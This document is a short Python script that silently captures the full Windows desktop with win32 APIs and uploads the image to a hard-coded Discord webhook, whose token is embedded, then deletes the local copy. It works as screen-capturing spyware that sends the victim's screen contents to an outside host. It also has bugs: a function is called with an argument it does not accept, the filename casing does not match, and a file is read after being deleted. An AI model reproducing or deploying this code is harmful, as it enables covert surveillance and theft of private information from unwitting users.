import base64
import win32api
import win32con
import win32gui
import win32ui
import requests
import os

def send_to_discord2():
    with open('screenshot.bmp', 'rb') as img_file:
        url = "https://discord.com/api/webhooks/1310611632774189117/Oyh7gztcnUUZKRDnUH3JZ7_s1LSwJ41yhU6LJZ4eMsLUyQOkByyhE_ehCA1jWmqMSShY"
        data = {"file": ('screenshot.bmp', img_file, "image/png")}
        requests.post(url, files=data)

def get_dimensions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return (width, height, left, top)

def screenshot():
    hdesktop = win32gui.GetDesktopWindow()
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    screenshot.SaveBitmapFile(mem_dc, f'Screenshot.bmp')

    send_to_discord2(f'screenshot.bmp')
    file_path = 'screenshot.bmp'
    os.remove(file_path)
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

def run():
    screenshot()
    with open('screenshot.bmp') as f:
        img = f.read()
    return img

if __name__ == '__main__':
    screenshot()